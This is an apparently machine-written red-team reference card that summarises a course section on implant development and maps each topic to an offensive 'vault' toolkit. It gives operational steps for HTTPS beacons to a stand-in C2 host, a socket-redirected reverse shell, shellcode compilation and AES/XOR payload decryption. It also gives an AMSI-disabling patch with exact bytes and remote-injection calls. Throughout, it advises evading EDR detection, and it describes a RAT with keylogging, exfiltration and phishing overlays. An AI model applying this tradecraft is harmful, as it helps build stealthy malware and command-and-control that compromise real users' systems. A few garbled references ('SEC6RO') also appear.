---
id: RTO-sec670-shellcode-c2-evasion
name: SEC670 — Shellcode in C, C2 Networking APIs & AMSI Bypass Bootcamp
source: Red Team Ops / SANS SEC670 (Section 5: Enhancing Your Implant)
category: evasion|crypto|c2-infrastructure|winapi
analyzed_by: glm-5.2
analysis_date: 2026-07-21
vault_references: [T-004, T-006, T-016, T-020, T-021, T-022, T-023]
tags: [shellcode, pic, intrinsics, aes, xor, base64, winhttp, wininet, wsa, amsi, code-cave, compiler-flags, cryptoapi, cng, ld-preload-style]
---

# SEC670 — Shellcode in C, C2 Networking APIs & AMSI Bypass Bootcamp — Training Reference

## TL;DR
Section 5 of SEC670 wraps the implant development arc with three operational pillars: (1) the WinHTTP/WinInet/WSASocket networking primitives that an implant uses to "call home," (2) a disciplined workflow for emitting position-independent shellcode from MSVC C/C++ (intrinsics, no strings, `/GS- /NODEFAULTLIB /SUBSYSTEM:NATIVE`), and (3) a bootcamp that has the student patch AMSI in a live PowerShell process and ship a custom shell. The vault's implementations (`T-021` AES-GCM+zstd pipeline, `T-016` AMSI HW-bypass, `T-022` malleable C2 / NT sockets) are strictly more advanced than what is taught here; this training is the *baseline tradecraft* that the vault builds on, so the cross-references below identify which vault card supersedes each teaching point.

## Key Concepts

1. **Networking API Tier Selection (WinHTTP vs WinInet vs WSASocket vs socket)**
   SEC670 frames the choice of network API as a telemetry/OPSEC decision. `socket()` is the BSD-style Winsock entry point and offers no handle redirection. `WSASocket()` is the Winsock2 variant that *returns a handle which can be redirected/inherited* — this is the pivot used by `WSADuplicateSocket` for handle-table manipulation and by `NtCreateUserProcess`-style file-handle hijacks. `WinHttpOpen` (session) → `WinHttpConnect` → `WinHttpOpenRequest` → `WinHttpSendRequest` is the WinHTTP call ladder; the WinInet equivalent is `InternetOpen` → `InternetConnect` → `HttpOpenRequest` → `HttpSendRequest`. WinHTTP is the preferred modern choice (smaller surface, used by services), WinInet is the legacy/IE stack (still common in malware for compatibility).
   - **Vault link**: `T-022` Network Suite implements `tcp_transport.rs`, `http_poll_transport.rs`, and `experimental/evasion/nt_sockets.rs` (AFD-driver-backed NT sockets that bypass Winsock entirely). The vault's NT Sockets path is materially stealthier than either `socket()` or `WSASocket()` taught here.

2. **Position-Independent Code (PIC) in C**
   PIC is non-negotiable for shellcode: no external references, no reliance on the system loader, no IAT, no `.data`/`.rdata`-backed initialized strings. The loader will not resolve APIs for you, and you cannot even assume `GetProcAddress`'s address is known — it must be discovered by walking `PEB → Ldr → InLoadOrderModuleList → DllBase → export table` (DJB2 hash compare on `DWORD` name halves). This is exactly the `T-004` PEB Walker pattern.
   - **Vault link**: `T-004` (PEB Walker via `gs:[0x60]`) is the operational implementation of the resolution pattern SEC670 only sketches. The vault uses DJB2 hashing with case-folding normalization; SEC670 leaves the hash function choice to the student.

3. **Compiler Intrinsics Instead of CRT**
   Because `/NODEFAULTLIB` removes CRT, every CRT helper (`memset`, `memcpy`, `strcmp`, `memcmp`, `strcpy`) must be replaced with its compiler intrinsic (`#pragma intrinsic(memset)` etc.). Intrinsics are forced inline by the compiler, have no DLL dependency, and are mandatory on x64 because MSVC disallows inline `__asm` blocks. Useful intrinsics for red team work: `__readgsqword` (PEB access), `__readfsdword` (TEB on x86), `__writegsqword`, `__movsb`/`__movsd` (memory move), `__writemsr` (kernel MSR writes). Header: `<intrin.h>`.
   - **Vault link**: `T-006` Phantom Stubs leverages the same intrinsic discipline (especially `__readgsqword` for PEB) when materializing MEM_IMAGE-backed syscall stubs; the Rust code uses `core::arch::asm!` instead of `#pragma intrinsic` because Rust has no equivalent pragma.

4. **String & Global Variable Avoidance**
   Initialized strings land in `.data`/`.rdata` and are trivially recovered by `strings.exe`, IDA's Strings subview, or Ghidra. SEC670's low-effort mitigation: build strings as stack-allocated char arrays (`char name[] = {'G','e','t','P',...,'A',0};`). SEC670 explicitly acknowledges this is *still recoverable* by static analysis — it only defeats naïve string scanners.
   - **Vault link**: `T-020` (IAT Camouflage, three profiles) and `T-021` (compile-time `obf!` proc macro that XORs each byte at build time and only materializes the plaintext transiently on the stack) are the operational-grade evolution of this concept. SEC670's stack-array technique is a teaching scaffold, not a final answer.

5. **MSVC Code-Generation Flags for PIC Shellcode**
   The canonical flag set for converting a C function into injectable shellcode:
   - Linker: `/NOENTRY` (DLLs only), custom `Entry Point`, `/OPT:NOREF` (keep unreferenced code), empty `Additional Dependencies`, `/NODEFAULTLIB`, `/MAP` (for extraction), `/SUBSYSTEM:NATIVE`
   - C/C++: `/GS-` (no stack cookies), `/MT` (static, though moot once `/NODEFAULTLIB`), exceptions off, `/SDL-`, debug info `None`
   The output is a `.dll`/`.exe` whose `.text` is a self-contained blob extractable via `sRDI` or a Donut-style converter.
   - **Vault link**: The vault's build pipeline (`dark_crystal/crates/obf/src/lib.rs`, build.rs) uses a Rust proc-macro to do compile-time obfuscation at the language level — a fundamentally different (and stronger) model than MSVC flag wrestling.

6. **CryptoAPI (Legacy AES) vs CNG (Next-Gen AES)**
   SEC670 teaches both:
   - **Legacy CryptoAPI**: `CryptAcquireContextA(PROV_RSA_AES)` → `CryptCreateHash` → `CryptHashData` → `CryptDeriveKey` → `CryptDecrypt` → cleanup. Marked deprecated by Microsoft.
   - **CNG (BCrypt\*)**: `BCryptOpenAlgorithmProvider` → `BCryptGetProperty` (call twice — first with NULL buffer to get size, second with allocated buffer) → `BCryptSetProperty(BCRYPT_CHAIN_MODE_CBC)` → `BCryptGenerateSymmetricKey` → `BCryptDecrypt`. The recommended modern path.
   - **Vault link**: `T-021` uses Rust's `aes-gcm` crate with **AES-256-GCM** (authenticated) + `zstd` compression, which is cryptographically stronger than CBC and removes the entire `bcrypt.dll` import surface. The vault's pipeline makes SEC670's CNG teaching obsolete for vault-aligned operators; the legacy CryptoAPI path is doubly obsolete.

7. **XOR as Symmetric "Encryption"**
   SEC670 takes the position that XOR with a key qualifies as encryption (because a key is involved) while conceding it provides effectively no entropy. The operational value is **NULL-byte elimination** for shellcode placed into fixed-size buffers, not serious confidentiality.
   - **Vault link**: `T-021` ships a multi-encoder shellcode suite (IPv4/IPv6/MAC/UUID/dictionary-words) that achieves both NULL-byte elimination *and* format-matching to innocuous network/registry-looking data. XOR is a degenerate case the vault does not bother implementing standalone.

8. **Base64 Encoding via `CryptStringToBinaryA` / `CryptBinaryToStringA`**
   Two CryptoAPI helpers cover Base64 in-memory. `CryptStringToBinaryA(lpszString, cchString, CRYPT_STRING_BASE64, pbBinary, pcbBinary, pdwSkip=NULL, pdwFlags)`. `CryptBinaryToStringA(pbBinary, cbBinary, CRYPT_STRING_BASE64, pszString, pcchString=NULL→let API size it)`. `certutil.exe -encode in.bin out.b64` is the offline CLI equivalent (note: `certutil -decode` exists for the reverse; SEC670 mentions `-encode` only, but both directions are operationally useful and `certutil` is a known LOLBin).
   - **Vault link**: `T-019` (Networking) and `T-020` (Crypto) treat Base64 as a transport-layer concern inside the malleable C2 profile engine (`henge.rs`) — encoding is profile-driven, not hand-coded per call.

9. **AMSI Bypass via Code Cave / Function Hook**
   The Lab 5.4 bootcamp challenge: inject a code cave into a live `powershell.exe` with `amsi.dll` loaded, observe the data flowing through `AmsiScanBuffer`, and patch `amsi.dll` to neutralize scanning. SEC670 deliberately leaves the patch construction as an exercise.
   - **Vault link**: `T-016` (EDR Evasion Suite) implements AMSI bypass via **hardware breakpoints** (`experimental/amsi_hbp.rs`) and via **PAGE_GUARD** (`amsi_page_guard.rs`). Both are stealthier than the byte-patch approach SEC670 hints at — byte patches to `amsi.dll!AmsiScanBuffer` (e.g., `mov eax, 0x80070057; ret`) are widely signatured and caught by integrity-checking EDRs. The vault's HW-bp approach leaves the bytes intact.

## Operational Techniques

### WinHTTP Beacon Session
- **What**: Establish an HTTPS C2 session using the WinHTTP API set (preferred over WinInet for modern implants).
- **When to use**: Default for any HTTPS implants on Windows 8+ where `WinHTTP` is available and you want a smaller import surface than WinInet's `wininet.dll`.
- **How**:
  1. `WinHttpOpen(L"UA-string", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0)` → returns session handle.
  2. `WinHttpConnect(hSession, L"c2.example.com", INTERNET_DEFAULT_HTTPS_PORT, 0)` → returns connect handle.
  3. `WinHttpOpenRequest(hConnect, L"POST", L"/api/checkin", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE)` → returns request handle.
  4. `WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, dwBodyLen, 0)`.
  5. `WinHttpReceiveResponse(hRequest, NULL)`.
  6. `WinHttpReadData` / `WinHttpWriteData` for body I/O.
- **Vault link**: `T-022` (Network Suite) `http_poll_transport.rs` is the vault's HTTP long-poll transport and is the operational successor. The vault also exposes a malleable C2 profile engine (`henge.rs`) that decouples the wire format from the transport — SEC670 has no malleable C2 concept.
- **Tool/code**: `winhttp.dll` imports `WinHttpOpen`, `WinHttpConnect`, `WinHttpOpenRequest`, `WinHttpSendRequest`, `WinHttpReceiveResponse`, `WinHttpReadData`, `WinHttpWriteData`, `WinHttpCloseHandle`.
- **OPSEC**: Default UA strings and default `INTERNET_DEFAULT_HTTPS_PORT` (443) are profiled. The `WinHttpOpen` UA is a common signature anchor — randomize or pull from a real browser profile. TLS interception by EDRs will see the SNI of `c2.example.com`; consider domain fronting or mTLS-terminated relays (vault's `rikudo.rs` multi-chain vault provides this).

### WinInet Beacon Session (Legacy Path)
- **What**: Same beacon pattern using the legacy WinInet stack.
- **When to use**: Only when you need WinInet's automatic IE-proxy / cookie / cache integration, or when targeting older OS versions / WinPE versions where WinHTTP is missing.
- **How**:
  1. `InternetOpen(L"UA", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0)` → session.
  2. `InternetConnect(hSession, L"c2.example.com", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTPS, 0, 0)` → connect.
  3. `HttpOpenRequest(hConnect, L"POST", L"/api/checkin", NULL, NULL, NULL, INTERNET_FLAG_SECURE | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_UI, 0)` → request.
  4. `HttpSendRequest(hRequest, NULL, 0, NULL, 0)`.
  5. `InternetReadFile` for response body.
- **Vault link**: `T-022`. The vault's `winhttp_dl.rs` (stager download path) is the closest analogue — used only for the staged payload acquisition step, not for the full beacon loop.
- **Tool/code**: `wininet.dll` imports `InternetOpen`, `InternetConnect`, `HttpOpenRequest`, `HttpSendRequest`, `InternetReadFile`, `InternetCloseHandle`.
- **OPSEC**: WinInet pulls in IE's full state — cookies, history, WinINet cache. This is *noisier* than WinHTTP on a service-context host. Avoid on implant processes.

### `WSASocket()` vs `socket()` — Handle Redirection Pivot
- **What**: `WSASocket` returns a socket handle that can be `WSADuplicateSocket`'d into another process (subject to SID/process-token constraints), enabling socket-handle-passing implant designs where the network thread lives in one process but the handle is consumed elsewhere.
- **When to use**: Multi-process implant designs (e.g., broker process owns the socket, child workers consume). Also the underlying primitive behind redirected-stdio reverse shells (`WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, WSA_FLAG_OVERLAPPED)` then `CreateProcess` with STARTUPINFO redirecting `hStdInput/hStdOutput/hStdError` to the socket handle).
- **How**: `WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, WSA_FLAG_OVERLAPPED)`. The handle is then a usable Win32 HANDLE for any `SetStdHandle`, `CreateProcess` (via `STARTUPINFO`), or `WSADuplicateSocket` operation.
- **Vault link**: `T-022` `nt_sockets.rs` (NT Sockets via AFD driver) is the operational evolution — direct `NtDeviceIoControlFile` against `\Device\Afd` bypasses the Winsock layer entirely. `WSASocket` remains user-mode Winsock; the AFD path is materially stealthier against Winsock-layer hooks.
- **Tool/code**: `ws2_32.dll` → `WSAStartup`, `WSASocketW`, `connect`, `WSARecv`, `WSASend`. (For socket-redirected shell: `CreateProcessA` with `STARTUPINFO{.hStdInput=hStdOutput=hStdError=hSocket}`.)
- **OPSEC**: Winsock-layer EDRs (most user-mode EDRs) hook `socket`/`connect`/`WSARecv`. NT socket path avoids this. The redirected-stdio shell pattern is detected by Sysmon EID 8 (CreateRemoteThread) and by `CreateProcess` callstack analysis when the stdio handles are unusual types.

### MSVC PIC Shellcode Build Pipeline
- **What**: Convert a single C function (or small set of functions) into injectable PIC shellcode using MSVC + Donut/sRDI-style extraction.
- **When to use**: Whenever you need to inject a non-trivial algorithm (decompressor, reflective loader, crypto routine) without writing pure asm.
- **How**:
  1. Project type: Win32 DLL (or EXE with custom entry). Target function marked `__declspec(dllexport)` for easy RVA extraction, or located via `/MAP` map file.
  2. C/C++ settings: `/GS-` (no cookies), `/MT` static (moot but conventional), `/SDL-`, `/EH-` (no C++ exceptions), debug info `None`, `/GL-` (no LTCG — LTCG merges functions unpredictably).
  3. Linker settings: `/NODEFAULTLIB`, `/NOENTRY` (DLL), custom entry point = your function name, `/OPT:NOREF` (preserve unreferenced exports), `/SUBSYSTEM:NATIVE`, `/MAP` (to locate your function RVA), `Generate Debug Info = No`.
  4. Replace CRT helpers with intrinsics: `#pragma intrinsic(memset, memcpy, memcmp, strcmp, strcpy)`. Replace `strlen` with a hand-rolled loop.
  5. Replace all string literals with stack char: `char n[] = {'G','e','t','P','r','o','c','A','d','d','r','e','s','s',0};`.
  6. Resolve all APIs via PEB walk + export-name DJB2 (see `T-004`).
  7. Build, then extract the target function's bytes from `.text` using the map file RVA + length (or use `sRDI` to convert the whole DLL).
- **Vault link**: `T-006` (Phantom Stubs) is the vault's PIC-shellcode-successor — instead of compiling C to a blob, the vault materializes MEM_IMAGE-backed stubs that look like legitimate `ntdll` syscall stubs. `T-021`'s `obf!` proc macro is the Rust-native string-hiding replacement for the stack-char trick.
- **Tool/code**: `cl.exe` (MSVC), `link.exe`, `dumpbin.exe /headers` and `/disasm`, `sRDI` (shellcode-converter), `donut.exe` (alternative, more aggressive).
- **OPSEC**: Map files leak function names — do not ship the `.map`. The extracted blob, if it contains recognizable instruction sequences (e.g., `call` to a `__chkstk`-style stub), is signatureable. YARA on PIC-shellcode prologue patterns (`fc 48 83 e4 f0` — `cld; and rsp, -10h`) is common; mangle the prologue.

### AES Decryption via CNG (Recommended Path)
- **What**: Decrypt an AES-CBC-encrypted shellcode blob using the `bcrypt.dll` CNG API set.
- **When to use**: When you have an encrypted payload embedded in the implant and need to materialize the plaintext at runtime without linking a third-party crypto library.
- **How**:
  1. `BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0)`.
  2. `BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, NULL, 0, &cbKeyObject, 0)` → size query.
  3. Allocate `cbKeyObject` bytes.
  4. `BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, pbKeyObject, cbKeyObject, &cbResult, 0)` → actual property.
  5. `BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0)`.
  6. `BCryptGenerateSymmetricKey(hAlg, &hKey, pbKeyObject, cbKeyObject, pbSecretKey, cbSecretKey, 0)`.
  7. `BCryptDecrypt(hKey, pbCipherText, cbCipherText, NULL, pbIV, cbIV, pbPlaintext, cbPlaintext, &cbResult, 0)`.
  8. `BCryptDestroyKey(hKey)`, `BCryptCloseAlgorithmProvider(hAlg, 0)`.
- **Vault link**: `T-021` (`dark_crystal/crates/core/src/crypto.rs`) uses Rust `aes-gcm` crate (AES-**256-GCM**, authenticated, no `bcrypt.dll` import at all, plus `zstd` compression). The vault path is strictly preferable: authenticated encryption defeats bit-flip attacks on the ciphertext that CBC cannot detect, and removing the `bcrypt.dll` import reduces static-detection surface.
- **Tool/code**: `bcrypt.dll` imports listed above.
- **OPSEC**: Import of `bcrypt.dll` in a small implant is a moderate signal (legitimate user-mode crypto-using apps do this too). Static signature on the API call sequence is possible. The IV handling (`pbIV`) is frequently mis-implemented — reusing IV with the same key is catastrophic; SEC670 does not belabor this, the vault's GCM path removes the IV-reuse class.

### AES Decryption via Legacy CryptoAPI (Deprecated Path)
- **What**: Same goal, using the deprecated `advapi32.dll` CryptoAPI set (`CryptAcquireContext` family).
- **When to use**: Effectively never in new code — Microsoft reserves the right to remove without warning. Maintain awareness only for analyst purposes (decoding legacy samples).
- **How**: `CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)` → `CryptCreateHash` → `CryptHashData(MD5/SHA1 of passphrase)` → `CryptDeriveKey` → `CryptDecrypt` → cleanup (`CryptDestroyKey`, `CryptDestroyHash`, `CryptReleaseContext`).
- **Vault link**: Superseded by `T-021` AES-256-GCM. Document this path only for understanding older malware samples.
- **Tool/code**: `advapi32.dll` CryptoAPI family.
- **OPSEC**: Highly signatured, deprecated, and uses passphrase-derived keys (no salt best-practice enforcement). Avoid.

### XOR "Encryption" of Shellcode
- **What**: Single-byte (or multi-byte) XOR loop over shellcode buffer.
- **When to use**: NULL-byte elimination only. Never as confidentiality.
- **How**:
  ```c
  void XorIt(PBYTE buf, SIZE_T len, BYTE key) {
      for (SIZE_T i = 0; i < len; i++) buf[i] ^= key;
  }
  ```
- **Vault link**: `T-021` shellcode-encoder suite (IPv4/IPv6/MAC/UUID/dictionary words) — all of which produce NULL-free output *and* a format that does not look like shellcode. XOR produces NULL-free output *that still looks like encrypted bytes*. The vault encoders are operationally dominant.
- **Tool/code**: trivial loop shown above.
- **OPSEC**: Single-byte XOR is detected by entropy + byte-distribution analysis in seconds. Multi-byte XOR only slightly better. This is a teaching scaffold, not a final obfuscator.

### Base64 Encoding/Decoding In-Process
- **What**: Encode/decode Base64 in memory using `CryptStringToBinaryA` / `CryptBinaryToStringA` (no external tooling needed at runtime).
- **When to use**: Base64 transport for shellcode over a text-safe channel (HTTP header, JSON body, registry value).
- **How**:
  - **Decode**: `CryptStringToBinaryA(lpszBase64, cchString, CRYPT_STRING_BASE64, pbBinary, &cbBinary, NULL, NULL)`.
  - **Encode (size first)**: `CryptBinaryToStringA(pbBinary, cbBinary, CRYPT_STRING_BASE64, NULL, &cchString)` then allocate and call again with `pszString` buffer.
  - **Offline**: `certutil.exe -encode in.bin out.b64` (and `-decode` for reverse). Note `certutil` is a known LOLBin — its execution is logged/flagged by many EDRs.
- **Vault link**: `T-022` malleable C2 profile engine (`henge.rs`) — encoding is configured per-profile, not hand-coded. `T-019` transport layers handle Base64 internally.
- **Tool/code**: `crypt32.dll` → `CryptStringToBinaryA`, `CryptBinaryToStringA`. CLI: `certutil.exe`.
- **OPSEC**: `certutil.exe -decode` executions are an EDR red flag (LOLBin alert). In-process Base64 via `crypt32.dll` is benign-looking.

### AMSI Patch via Code Cave / Function Hook (Lab 5.4)
- **What**: Disable AMSI scanning in a live `powershell.exe` process by injecting a code cave and patching `amsi.dll!AmsiScanBuffer` (or `AmsiInitialize`, or the CLR's AMSI init path).
- **When to use**: When running in-memory .NET/PowerShell payloads under a defender that uses AMSI (Windows Defender, many third-party EDRs).
- **How** (SEC670 leaves this as exercise — sketch):
  1. Find `powershell.exe` with `amsi.dll` loaded (`EnumProcessModules` / `Module32First` via `CreateToolhelp32Snapshot`).
  2. Locate `AmsiScanBuffer` RVA inside `amsi.dll` (`GetProcAddress(GetModuleHandle("amsi.dll"), "AmsiScanBuffer")`).
  3. Allocate a code cave in the target process (`VirtualAllocEx` with `PAGE_EXECUTE_READWRITE`).
  4. Write cave code that returns `AMSIN_RESULT_FALSE` (`0x80070057` = `E_INVALIDARG`) via `mov eax, 0x80070057; ret` (15-ish bytes; multiple equivalent patches exist).
  5. Trampoline `AmsiScanBuffer`'s first instructions to the cave (preserve instruction boundaries!) and replace the first bytes with a jump to the cave, or simply overwrite the first bytes of `AmsiScanBuffer` with `mov eax, 0x80070057; ret` directly (the simpler, more-detected approach).
- **Vault link**: `T-016` EDR Evasion Suite — the vault implements AMSI bypass via **hardware breakpoints** (`amsi_hbp.rs`) and **PAGE_GUARD** (`amsi_page_guard.rs`). Both leave `amsi.dll`'s bytes intact, defeating integrity-checking EDRs that scan for the `0x80070057` byte signature. SEC670's approach is the *classic but signatured* path; the vault's HW-bp path is materially stealthier and should be preferred operationally.
- **Tool/code**: `VirtualAllocEx`, `WriteProcessMemory`, `CreateRemoteThread` (or `QueueUserAPC`/thread hijack for stealthier execution — see `T-012` Early Cascade / `T-007` Pool Party).
- **OPSEC**: Direct byte-patch on `AmsiScanBuffer` (`B8 57 00 07 80 C2 03 00`) is signatured by every major EDR with integrity checking. The HW-bp path in `T-016` defeats this. If you must byte-patch, patch `AmsiInitialize` to fail (forces no-AMSI fall-back) rather than `AmsiScanBuffer` directly — less commonly signatured but easier to detect by integrity check.

### Custom Shell Development (Lab 5.5: ShadowCraft)
- **What**: Implement a basic command shell with error checking, building on all prior modules (loader, unhooker, networking, AMSI patch).
- **When to use**: As the integration capstone — exercise every primitive taught in Section 5.
- **How**: SEC670 deliberately leaves this open-ended. Recommended feature set based on the module progression:
  1. Transport: WinHTTP-based checkin + read/write loop.
  2. Command dispatch: `exec` (run process — `CreateProcess`), `cd` (chdir), `pwd` (`GetCurrentDirectory`), `ls` (`FindFirstFile`/`FindNextFile`), `download` (read file, chunk, encode Base64, send), `upload` (decode Base64, write), `exit`.
  3. Error checking: every Win32 call checked, errors reported back to C2.
  4. AMSI patched on init (Lab 5.4).
  5. Unhooking applied on init (Lab 5.2 — `UnhookTheHook`, referenced but not detailed in this batch).
- **Vault link**: `T-023` (Client Capabilities) is the operational implementation — full RAT capability set including `commands.rs` dispatch FSM, `byakugan.rs` recon, `amaterasu.rs` exfil, `keylogger.rs`, `browser_hook.rs`, `overlay.rs` / `html_overlay.rs` phishing, etc. SEC670's ShadowCraft is the minimal shell the vault's client_rust is the production version of.
- **Tool/code**: All APIs from prior labs, composed.
- **OPSEC**: A flat command shell with no obfuscation of command names is trivially fingerprinted from traffic. Use the vault's malleable C2 profile pattern (`T-022` `henge.rs`) to decouple wire format from implementation.

## Tool & Tradecraft Reference

| Tool/Command | Purpose | OPSEC Notes |
|---|---|---|
| `WinHttpOpen` / `WinHttpConnect` / `WinHttpOpenRequest` / `WinHttpSendRequest` / `WinHttpReceiveResponse` | WinHTTP beacon ladder | Smaller import surface than WinInet; still hooked by user-mode EDRs |
| `InternetOpen` / `InternetConnect` / `HttpOpenRequest` / `HttpSendRequest` / `InternetReadFile` | WinInet beacon ladder (legacy) | Pulls IE state (cookies, cache) — noisier |
| `socket()` | BSD Winsock socket creation | No handle redirection; trivially hooked |
| `WSASocketW(..., WSA_FLAG_OVERLAPPED)` | Winsock2 socket with redirection capability | Enables redirected-stdio shells and `WSADuplicateSocket` IPC |
| `certutil.exe -encode in.bin out.b64` | Offline Base64 encode (LOLBin) | Flagged by EDRs as LOLBin; prefer in-process `CryptBinaryToStringA` |
| `CryptStringToBinaryA` | In-process Base64 decode | Benign-looking `crypt32.dll` import |
| `CryptBinaryToStringA` | In-process Base64 encode (size-query then fill) | Same |
| `#pragma intrinsic(memset, memcpy, ...)` | Force CRT helpers inline for PIC | Mandatory with `/NODEFAULTLIB` |
| `<intrin.h>` intrinsics (`__readgsqword`, `__movsb`, `__writegsqword`, `__readfsdword`, `__writemsr`) | Compiler-baked primitives, no DLL dep | `__writemsr` is ring-0 only |
| MSVC flags `/GS- /NODEFAULTLIB /NOENTRY /SUBSYSTEM:NATIVE /OPT:NOREF /MAP /SDL-` | PIC shellcode code-gen | Do not ship `.map` file — leaks symbol names |
| `sRDI` / `donut.exe` | DLL→shellcode conversion | Donut adds its own loader (bigger blob, more surface) |
| `dumpbin.exe /headers` `/disasm` | Inspect compiled output | Use to verify no IAT / no `.rdata` strings slipped in |
| `BCryptOpenAlgorithmProvider` / `BCryptSetProperty(BCRYPT_CHAIN_MODE_CBC)` / `BCryptGenerateSymmetricKey` / `BCryptDecrypt` | CNG AES-CBC decryption | `bcrypt.dll` import; CBC has no integrity — prefer GCM |
| `CryptAcquireContextA(PROV_RSA_AES)` family | Legacy CryptoAPI AES (deprecated) | Avoid in new code; signatured |
| `VirtualAllocEx` / `WriteProcessMemory` / `CreateRemoteThread` | AMSI patch injection (classic) | Heavily signatured; prefer `T-012` Early Cascade or `T-007` Pool Party for injection |
| `AmsiScanBuffer` byte patch (`B8 57 00 07 80 C2 03 00`) | Disable AMSI scan in target process | Detected by integrity-checking EDRs; use `T-016` HW-bp path instead |
| `strings.exe` / IDA Strings subview / Ghidra | Analyst tool to recover embedded strings | Defensive — what you must defeat |
| `peb walk` (manual `gs:[0x60]` → `Ldr` → `InLoadOrderModuleList`) | Resolve APIs without `GetProcAddress` | Taught conceptually; see `T-004` for full impl |
| Stack char arrays (`char n[] = {'G','e','t',...,'A',0}`) | Hide strings from `.data`/`.rdata` | Still recoverable by static analysis; `T-021` `obf!` macro is better |

## Gaps & Extensions

**What the vault covers that this training does not:**

1. **Indirect syscalls** (T-001, T-002, T-003, T-006) — SEC670 never mentions SSN resolution, Hell's/Halo's/Tartarus Gate, FreshyCalls, RecycledGate, or VEH Gate. All of the SEC670 API calls (`VirtualAllocEx`, `WriteProcessMemory`, `WinHttpOpen`, `BCryptDecrypt`) are direct user-mode calls through hooked DLLs — exactly what the vault's syscall stack exists to avoid. **An operator applying SEC670 teachings directly against a modern EDR will get caught at the API hook layer** unless they first wrap every call in the vault's `RecycledGate` (`T-001`) or `VEH Gate` (`T-003`).
2. **Sleep obfuscation** (T-005) — SEC670 has no equivalent. An SEC670 implant sleeps in plaintext in RWX memory.
3. **Modern process injection** (T-007 through T-015) — SEC670's AMSI patch lab uses classic `VirtualAllocEx`+`WriteProcessMemory`+`CreateRemoteThread`. The vault's `Pool Party`, `Threadless`, `Early Cascade`, `Dirty Vanity` are all stealthier. The vault also covers `Process Ghosting` / `Herpaderping` for executing payload binaries without touching disk in a recognizable form — SEC670 has no equivalent.
4. **Malleable C2 profiles** (T-022 `henge.rs`) — SEC670 hardcodes the HTTP request shape. The vault separates profile from transport.
5. **NT sockets / AFD-direct networking** (T-022 `nt_sockets.rs`) — bypasses Winsock entirely. SEC670 only teaches Winsock/WinHTTP/WinInet.
6. **Crypto upgrade to AES-256-GCM + zstd** (T-021) — SEC670 teaches deprecated CBC + CryptoAPI and BCrypt CBC. The vault uses authenticated encryption.
7. **Compile-time string obfuscation proc macro** (T-021 `obf!`) — SEC670's stack-array technique is manual and partial.
8. **Hardware-breakpoint AMSI bypass** (T-016 `amsi_hbp.rs`) and PAGE_GUARD bypass (`amsi_page_guard.rs`) — SEC670's byte-patch approach is exactly what these were invented to supersede.
9. **Persistence suite** (T-017 through T-019) — SEC670 has nothing comparable in this batch (persistence is covered in a different section not in this input).
10. **Anti-analysis suite** (T-020) — anti-VM (10 checks), API hammering, IAT camouflage (3 profiles), self-deletion via ADS, Kaguya LOtL. SEC670 mentions `strings` recovery as a threat but does not teach active anti-analysis.
11. **Multi-format shellcode encoding** (T-021 IPv4/IPv6/MAC/UUID/words) — SEC670 teaches only XOR and Base64.

**What this training covers that the vault does not (or covers less explicitly):**

1. **Detailed MSVC flag inventory for PIC shellcode compilation** — the vault's Rust build pipeline does not surface these MSVC specifics because it does not build MSVC shellcode. Operators who must produce MSVC-compiled C/C++ shellcode (e.g., for legacy injection targets, or for interop with .NET-loaded unmanaged exports) need this flag set: `/GS- /NODEFAULTLIB /NOENTRY /SUBSYSTEM:NATIVE /OPT:NOREF /MAP /SDL- /EH-`.
2. **`certutil.exe -encode`** as an offline Base64 CLI — useful for OPSEC-poor operator-side scripting (NOT for implant-side use).
3. **Legacy CryptoAPI `PROV_RSA_AES` family** — valuable for *reading* older malware samples and for understanding EDR signature patterns on this API sequence. The vault does not document this deprecated path.
4. **`WSASocketW` + `STARTUPINFO` stdio redirection** for one-line reverse shell — the vault does not explicitly call out the `WSA_FLAG_OVERLAPPED` + `hStdInput=hStdOutput=hStdError=hSocket` pattern; it lives in the older tradecraft space the vault moved past.
5. **The "size-query first, allocate, call again" CNG idiom** (`BCryptGetProperty` with NULL buffer to get size, then allocate, then real call) — a generic Windows API pattern operators should recognize; the vault's Rust wrapper hides this behind RAII.

## Cross-Reference Matrix

| Training Concept | Vault Technique | Relationship |
|---|---|---|
| WinHTTP beacon (`WinHttpOpen` ladder) | T-022 Network Suite (`http_poll_transport.rs`, `henge.rs`) | Vault implements full HTTP long-poll transport + malleable profile; SEC670 teaches raw WinHTTP call ladder |
| WinInet beacon (`InternetOpen` ladder) | T-022 Network Suite | Vault has `winhttp_dl.rs` for staged download only; WinInet path not used operationally |
| `WSASocketW` / `socket()` comparison | T-022 Network Suite (`nt_sockets.rs`) | Vault's NT socket / AFD path bypasses Winsock entirely — strictly stealthier |
| PEB walk for API resolution (concept) | T-004 PEB Walker | Vault implements full `gs:[0x60]` PEB walk with DJB2 hash; SEC670 only sketches the pattern |
| Stack char arrays to hide strings | T-021 Crypto & Obfuscation (`obf!` proc macro) | Vault obfuscates strings at compile time with XOR + transient stack materialization; SEC6RO stack-array is a weaker manual version |
| MSVC PIC shellcode flags (`/GS- /NODEFAULTLIB /SUBSYSTEM:NATIVE`) | T-006 Phantom Stubs | Vault uses Rust + inline asm for syscall stubs instead of MSVC-compiled PIC; SEC670's flag set remains relevant for any operator still using MSVC |
| Compiler intrinsics (`#pragma intrinsic`, `__readgsqword`) | T-006 Phantom Stubs, T-004 PEB Walker | Vault uses Rust `core::arch::asm!` for the same primitives; SEC6RO's `<intrin.h>` is MSVC-only equivalent |
